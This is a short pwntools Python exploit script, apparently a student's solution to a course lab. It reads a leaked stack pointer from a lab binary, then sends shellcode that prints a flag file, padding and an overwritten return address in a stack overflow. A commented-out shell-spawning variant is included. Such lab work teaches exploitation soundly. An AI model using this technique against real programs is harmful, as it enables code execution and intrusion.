#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import os

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise2/exercise2a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *check_authorization+88
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
r = start()

# You can now communicate with the process, e.g.,
stack_ptr = r.recvline()
r.recvline()
print(f"Stack pointer Received: {stack_ptr}")
# while b'0x' not in stack_ptr:
#     stack_ptr = r.recvline()

stack_ptr = stack_ptr[:-1]
stack_ptr = p64(int(stack_ptr, 16))
print(f"Stack pointer unpacked: {stack_ptr}")

# shellcode = asm(pwnlib.shellcraft.amd64.sh(), arch='amd64')
shellcode = asm(pwnlib.shellcraft.amd64.linux.cat("/home/student/flag"))
print(f"Len of shellcode: {len(shellcode)}")
# payload = b"\x90"*40        # 40
payload = shellcode         # 62
payload += b"A"*(154)       # (208 - 62) + 8
payload += stack_ptr

r.sendline(payload)
print(r.recvall())

